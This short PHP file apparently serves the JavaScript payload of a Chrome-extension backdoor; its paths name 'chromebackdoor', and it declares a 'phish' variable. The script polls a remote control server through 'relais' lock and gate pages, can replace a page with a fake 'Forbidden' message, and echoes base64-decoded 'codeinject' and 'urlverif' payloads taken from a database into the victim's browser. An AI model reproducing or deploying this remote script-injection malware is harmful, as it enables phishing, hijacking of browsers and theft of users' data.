<?php
require_once('includes/config.php');
?>
$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    var server_web = "http://localhost:8888/taff/private/chromebackdoor/"
    var lock_page = "relais/lock.php"
    var gate_page = "relais/index.php"
    //locking function
    function locking()
    {
       document.write("<h1>Forbidden !</h1><p>you don't have permission to access / on this server</p>");
    }
    function lock()
    {
        $.get(server_web+lock_page,function(data)
        {
            if(data == '1')
            {
                locking();
            }
        });
    }
    lock();
    <?php
    $select_url_check = $bdd->prepare("SELECT urlverif FROM payloads");
    $select_url_check->execute();
    while($fetch = $select_url_check->fetch())
    {
        $url_verif = $fetch['urlverif'];
        echo base64_decode($url_verif);
    }
    
    $select_inject_check = $bdd->prepare("SELECT codeinject FROM payloads");
    $select_inject_check->execute();
    while($fetch2 = $select_inject_check->fetch())
    {
        $inject = $fetch2['codeinject'];
        echo base64_decode($inject);
    }
    ?>
});
